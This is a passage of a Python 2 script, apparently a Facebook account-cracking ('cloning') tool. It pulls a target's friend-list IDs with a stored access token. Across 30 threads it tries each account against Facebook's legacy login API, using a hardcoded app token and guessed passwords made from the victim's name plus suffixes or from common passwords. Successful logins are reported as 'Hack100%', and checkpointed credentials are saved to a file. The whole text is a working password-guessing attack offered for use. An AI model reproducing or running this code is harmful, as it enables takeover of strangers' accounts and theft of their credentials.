				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = (b['first_name'] + b['last_name'])						
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'						
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = (b['first_name']+'1122')										
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = (b['first_name']+'khan')					
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'					
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = (b['first_name']+'786')											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = (b['first_name']+'007')					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'			
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’"
	print "  \033[1;94mΒ«---β’ββ’---Developed By γπ΄π·ππ°ππ·π°πΌγ--β’ββ’---Β»" #Dev:γπ΄π·ππ°ππ·π°πΌγ
	print '\033[1;94mβProcess Has Been Completed Pressβ‘ Ctrl+Z.β© Next Type (0 & Data Reset)β©\033[1;97m....'
	print"\033[1;91mTotal OK/\x1b[1;94mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))
	print """
             

_________γπ΄π·ππ°ππ·π°πΌγ
_________Mere_YouTube_channel_ko_like
_________And_subscribe_kardain
_________Thanksππ
_________π
_________β€
_________βοΈ
_________π₯
_________π
_________π€
_________π
_________π
 
         Checkpoint ID Open After 7 Days

β’\033[1;97mββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’.
: \033[1;94m .....γπ΄π·ππ°ππ·π°πΌγ....... \033[1;97m :
β’\033[1;97mββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’.' 
                WhatsApp π
              \033[1;94m +923434810071"""
	
	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
	menu()

def test():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID Testing."
        print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;97m2.\x1b[1;92mBlack Jerry WhatsApp Group."
        print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;97m3.\x1b[1;92mBlack Jerry Youtube Chenal."
	print "\033[1;97m-β’ββ’-\033[1;97m> \033[1;97m0.\033[1;91mBack"
	pilih_test()

def pilih_test():
	peak = raw_input("\n\033[1;95mChoose an Option>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;94mFill in correctly"
		pilih_test()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m[β’ββ’] \033[1;94mEnter ID\033[1;97m: \033[1;97m")
		print "\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mName\033[1;97m:\033[1;94m "+op["name"]
		except KeyError:
			print"\x1b[1;97mID Not Found!"
			raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
			test()
		print"\033[1;94mGetting IDs\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
        elif peak =="2":
	        os.system('xdg-open https://chat.whatsapp.com/FEs3oMSgDxo5pN')
	        menu()
        elif peak =="3":
	        os.system('xdg-open https://www.youtube.com/channel/UCuUzgS7lnF7S6xnWNl9aIgg')
	        menu()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;97mFill in correctly"
		pilih_test()
	
	print "\033[1;97mTotal IDs\033[1;97m: \033[1;94m"+str(len(id))
	jalan('\033[1;94mPlease Wait\033[1;94m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;94mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;97mΒ«--β’ββ’β’ββ’---\x1b[1;94mβ’ββ’Stop Process Press CTRL+Zβ’ββ’\033[1;97m---β’ββ’β’ββ’-Β»"
	print "\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬ β’ββ’"
	jalan(' \033[1;97m.................\033[1;94mCloning Start..\033[1;97m............ ')
	print "\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’\033[1;93mγπ΄π·ππ°ππ·π°πΌγ\033[1;97mβ’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬ β’ββ’"
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Dev:γπ΄π·ππ°ππ·π°πΌγ
		try:													
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = 'zxcvbnm'											
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b ['name']
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				    print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass1 + '\n'
				    cek = open("out/super_cp.txt", "a")
				    cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = 'a1b2c3'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
				            print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = 'iloveyou'								
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'								
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							
						       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = '112233'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = '123456'				
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'						
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					
						                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                   print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = '0987654321'								
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									
				                                                           print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                               print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = 'qwerty'					
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'					
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
									                               print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                           print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = 'password'										
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'											
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										
				                                                                                   print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;93m[ β ] \x1b[1;91mCheckpoint'
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                       print '\x1b[1;93m[β’β±βΏβ°β’] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = 'abc123'				
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[  β  ] \x1b[1;92mHack100%'			
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	
											                                       print '\x1b[1;91m[β’β±βΏβ°β’] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
